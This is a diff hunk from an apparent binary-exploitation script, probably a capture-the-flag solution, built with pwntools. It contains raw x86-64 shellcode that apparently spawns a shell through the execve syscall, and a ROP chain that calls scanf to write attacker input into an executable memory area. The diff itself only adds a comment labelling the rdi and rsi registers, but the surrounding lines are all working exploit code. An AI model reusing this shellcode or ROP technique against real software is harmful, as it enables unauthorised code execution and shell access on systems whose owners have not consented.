@@ -39,6 +39,7 @@ print conn.recvline()
 shellcode = "\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x31\xc0\x99\x31\xf6\x54\x5f\xb0\x3b\x0f\x05"
 
 # scanf("%s", @RWX_AREA)
+#       rdi   rsi
 rop =  p64(pop_rdi) + p64(scanf_string)
 rop += p64(pop_rsi_r15) + p64(bin_x) + p64(0xdeadbeef)
 rop += p64(scanf_plt)
